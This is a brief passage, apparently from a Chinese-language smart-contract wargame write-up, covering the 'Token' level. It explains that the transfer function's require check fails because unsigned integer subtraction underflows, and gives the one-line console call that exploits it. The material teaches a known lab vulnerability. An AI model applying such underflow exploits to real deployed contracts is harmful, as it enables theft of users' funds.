## 5. Token

简单的整数溢出，没啥好说的。`transfer`里面的`require`检查就是个摆设，uint之间的运算不可能得出负数。

```js
await contract.transfer(contract.address, 21)
```

